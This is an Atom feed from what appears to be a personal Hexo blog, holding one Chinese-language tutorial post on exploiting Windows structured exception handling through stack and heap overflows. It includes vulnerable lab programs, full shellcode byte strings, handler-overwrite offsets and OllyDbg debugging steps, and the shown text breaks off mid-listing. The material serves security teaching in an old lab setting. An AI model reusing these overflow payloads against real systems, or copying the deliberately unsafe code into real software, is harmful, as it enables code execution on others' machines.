<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  <subtitle>Share station</subtitle>
  <link href="https://www.rgzzplus.com/atom.xml" rel="self"/>
  
  <link href="https://www.rgzzplus.com/"/>
  <updated>2022-04-23T13:11:23.983Z</updated>
  <id>https://www.rgzzplus.com/</id>
  
  <author>
    <name>rgzzplus</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>形形色色的内存攻击技术</title>
    <link href="https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/"/>
    <id>https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</id>
    <published>2022-04-23T13:09:12.000Z</published>
    <updated>2022-04-23T13:11:23.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="狙击-windows-异常处理机制"><a class="markdownIt-Anchor" href="#狙击-windows-异常处理机制"></a> 狙击 Windows 异常处理机制</h1><h2 id="seh-概述"><a class="markdownIt-Anchor" href="#seh-概述"></a> S.E.H 概述</h2><p>S.E.H 即异常处理结构体（Structure Exception Handler)，它包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418093731897.png" alt="image-20220418093731897"></p><h3 id="seh-初步了解"><a class="markdownIt-Anchor" href="#seh-初步了解"></a> S.E.H 初步了解</h3><p>S.E.H 链表：<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418095153126.png" alt="image-20220418095153126"></p><p>**设计思路：**在系统关闭程序前，给程序一个执行预先设定的回调函数的机会</p><p><strong>工作原理：</strong><br>（ 1） S.E.H 结构体<strong>存放在系统栈中</strong>。<br>（ 2）当线程初始化时，会自动向栈中安装一个 S.E.H，作为线程默认的异常处理。<br>（ 3）如果程序源代码中使用了__try{}，__except{}或者 Assert 宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个 S.E.H 来实现异常处理。<br>（ 4）栈中一般会同时存在多个 S.E.H。<br>（ 5）栈中的多个 S.E.H 通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的 S.E.H 通过 T.E.B（线程环境块） 0 字节偏移处的指针标识。<br>（ 6）当异常发生时，操作系统会中断程序，并首先从 T.E.B 的 0 字节偏移处取出距离栈顶最近的 S.E.H，使用异常处理函数句柄所指向的代码来处理异常。<br>（ 7）当离“事故现场”最近的异常处理函数运行失败时，将顺着 S.E.H 链表依次尝试其他的异常处理函数。<br>（ 8）如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</p><p><strong>利用思路：</strong><br>（ 1） <strong>S.E.H 存放在栈内</strong>，故溢出缓冲区的数据有可能淹没 S.E.H。<br>（ 2）精心制造的溢出数据可以把 S.E.H 中异常处理函数的入口地址更改为 shellcode 的起始地址。<br>（ 3）溢出后错误的栈帧或堆块数据往往会触发异常。<br>（ 4）当 Windows 开始处理溢出后的异常时，会错误地把 shellcode 当作异常处理函数而执行。</p><h2 id="在栈溢出中利用-seh"><a class="markdownIt-Anchor" href="#在栈溢出中利用-seh"></a> 在栈溢出中利用 S.E.H</h2><h3 id="实验代码即相关介绍"><a class="markdownIt-Anchor" href="#实验代码即相关介绍"></a> 实验代码即相关介绍</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>;<span class="comment">//200 bytes 0x90</span></span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">//used to break process for debug</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf,input); <span class="comment">//overrun the stack</span></span><br><span class="line">zero=<span class="number">4</span>/zero; <span class="comment">//generate an exception</span></span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释：</strong><br>（ 1）函数 test 中存在典型的栈溢出漏洞，<code>strcpy()</code>函数<br>（ 2） __try{}会在 test 的函数栈帧中安装一个 S.E.H 结构。<br>（ 3） __try 中的除零操作会产生一个异常。<br>（ 4）当 strcpy 操作没有产生溢出时，除零操作的异常将最终被 MyExceptionhandler 函数<br>处理。<br>（ 5）当 strcpy 操作产生溢出，并精确地将栈帧中的 S.E.H 异常处理句柄修改为 shellcode 的<br>入口地址时，操作系统将会错误地使用 shellcode 去处理除零异常，也就是说，代码植入成功。<br>（ 6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在代码中加入断点_asm int 3，让进程自动中断后再用调试器 attach 的方法进行调试。</p><p>**原理：**确定栈帧中 S.E.H 回调句柄的偏移，然后布置缓冲区，淹没这个句柄，将句柄修改为shellcode 的起始位置。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2000 虚拟机与实体均可</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td></tr><tr><td>编译选项</td><td>默认编译选项</td></tr><tr><td>build 版本</td><td>release 版本 必须使用 release 版本进行调试</td></tr></tbody></table><blockquote><p>说明： Windows XP SP2 和 Windows 2003 中加入了对 S.E.H 的安全校验，因此会导致实验失败。</p></blockquote><h3 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h3><p><strong>第一步：确定 shellcode 的起始位置 和 S.E.H 回调句柄的偏移</strong></p><p>暂时将 shellcode 赋值为一段 <code>0x90</code>，运行代码，如下图所示，shellcode 的起始地址为<code>0x0012fe48</code><br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418111708935.png" alt="image-20220418111708935"></p><p>查看所有的 S.E.H 结构的位置和其注册的异常回调函数句柄，依次点击OllyDbg菜单中的 “查看” —&gt; “SEH链”<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112245646.png" alt="image-20220418112245646"><br>上图显示当前线程安装了 3 个S.E.H，当发生异常时，位于<code>0x0012ff68</code>处的 S.E.H 将第一个被调用</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112754437.png" alt="image-20220418112754437"><br><code>0x0012ff1c</code>处的指针<code>0x004017f8</code>是我们需要修改的异常回调函数句柄。</p><p><strong>第二步：组织缓冲区</strong>，把<code>0x0012ff1c</code>处的回调句柄修改成 shellcode 的起始地址 <code>0x0012fe48</code></p><p>缓冲区起始地址 <code>0x0012fe48</code>与异常句柄 <code>0x0012ff1c</code>之间共有 212 个字节的间隙。</p><p>仍然用弹出 “failwest” 消息框的 shellcode 进行测试，将不足 212 字节的部分用 <code>0x90</code>补齐。缓冲区最后的 4 个字节，即 209~212字节使用 shellcode 的起始地址<code>0x0012fe48</code>填充，来覆盖异常回调函数的句柄；最后删去中断指令__asm int 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x48\xFE\x12\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">_try</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf,input); <span class="comment">//overrun the stack</span></span><br><span class="line">zero=<span class="number">4</span>/zero; <span class="comment">//generate an exception</span></span><br><span class="line">&#125;</span><br><span class="line">_except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下代码，弹出了 “failwest” 消息框，如下图，栈溢出成功<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418122923348.png" alt="实验结果failwest"></p><p>这时操作系统错误的使用 shellcode 去处理除零异常，从而使植入代码运行。</p><h2 id="在堆溢出中利用-seh"><a class="markdownIt-Anchor" href="#在堆溢出中利用-seh"></a> 在堆溢出中利用 S.E.H</h2><p>堆溢出发生往往同时伴随着异常产生，所以 S.E.H 通常也是堆溢出 DWORD SHOOT 的目标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x52\x00&quot;</span><span class="comment">//0x00520688 is the address of shellcode in first</span></span><br><span class="line"><span class="comment">//Heapblock</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span>;<span class="comment">//target of DWORD SHOOT</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>);<span class="comment">// over flow here, noticed 0x200 means</span></span><br><span class="line"><span class="comment">//512 !</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">// uesd to break the process</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实验思路：</strong><br>（ 1）溢出第一个堆块的数据将写入后面的空闲堆块，在第二次堆分配时发生 DWORD SHOOT。<br>（ 2）将 S.E.H 的异常回调函数地址作为 DWORD SHOOT 的目标，将其替换为 shellcode 的入口地址，异常发生后，操作系统将错误地把 shellcode 当作异常处理函数而执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2000 虚拟机和实体机均可。</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td></tr><tr><td>编译选项</td><td>默认编译选项</td></tr><tr><td>build 版本</td><td>release 版本 必须使用 release 版本进行调试</td></tr></tbody></table><blockquote><p><strong>说明：</strong><br>即使完全按照推荐的实验环境进行操作， S.E.H 中异常回调函数句柄的地址及 shellcode 的起始地址可能仍然需要在调试中重新确定。</p></blockquote><p><strong>第一步：找到 S.E.H 的位置 和 shellcode 的位置</strong></p><p>首先，我们把 DWORD SHOOT 最后 4 个字节的 target 设置为一个无效的内存地址，如<code>0x90909090</code>，让程序触发异常。我们所需要做的就是在程序运行时，找到 S.E.H 的位置，然后把 DWORD SHOOT 的 target 指向 S.E.H 的回调句柄。</p><p>在调试前应当确认 OllyDbg 能够捕捉所有的异常，方法是查看菜单“options”下的“debugging<br>option”中“ Exceptions”选项中没有忽略任何类型的异常，如下图所示</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418212828226.png" alt="image-20220418212828226"></p><p>然后编译运行代码，程序会自动中断，进入 OllyDbg。在寄存器 <code>EAX</code> 中，显示了HeapAlloc（）函数分配的堆的地址，即 shellcode 的起始位置，如下图所示，这里 EAX = 0x00360688<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418220922950.png" alt="image-20220418220922950"></p><p>跳过中断后，按 F9 继续运行，DWORD SHOOT 发生后，程序产生异常。OllyDbg 捕捉到异常后会自动中断，如下图所示<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214132858.png" alt="image-20220418214132858"></p><p>这时查看栈中 S.E.H 情况：View —&gt; SEH chain，如下图所示<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214323855.png" alt="image-20220418214323855"></p><p><strong>第二步：组织缓冲区</strong></p><p>发现离第一个 S.E.H 位于 <code>0x0012FEEC</code> 的地方，那么异常回调函数的句柄应该位于这个地址后 4 个字节的位置 <code>0x0012FEF0</code>。现在，将 DWORD SHOOT 的目标地址由 <code>0x90909090</code> 改为 <code>0x0012FEF0</code>，去掉程序中的中断指令，重新编译运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block </span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00&quot;</span><span class="comment">//0x00360688 is the address of shellcode in first</span></span><br><span class="line"><span class="comment">//Heapblock</span></span><br><span class="line"><span class="string">&quot;\xF0\xFE\x12\x00&quot;</span>;<span class="comment">//target of DWORD SHOOT</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span 